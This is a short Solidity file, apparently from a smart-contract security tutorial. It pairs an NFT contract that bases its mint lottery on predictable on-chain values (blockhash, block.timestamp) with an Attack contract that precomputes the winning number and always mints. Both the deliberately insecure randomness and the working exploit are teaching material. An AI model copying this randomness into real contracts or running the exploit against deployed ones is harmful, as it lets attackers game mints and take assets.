// SPDX-License-Identifier: MIT
// By 0xAA
// english translation by 22X
pragma solidity ^0.8.21;
import "../34_ERC721/ERC721.sol";

contract BadRandomness is ERC721 {
    uint256 totalSupply;

    // Constructor, initializes the name and symbol of the NFT collection
    constructor() ERC721("", ""){}

    // Mint function: can only mint when the input luckyNumber is equal to the random number
    function luckyMint(uint256 luckyNumber) external {
        uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100; // get bad random number
        require(randomNumber == luckyNumber, "Better luck next time!");

        _mint(msg.sender, totalSupply); // mint
        totalSupply++;
    }
}

contract Attack {
    function attackMint(BadRandomness nftAddr) external {
        // Pre-calculate the random number
        uint256 luckyNumber = uint256(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        ) % 100;
        // Attack using the luckyNumber
        nftAddr.luckyMint(luckyNumber);
    }
}
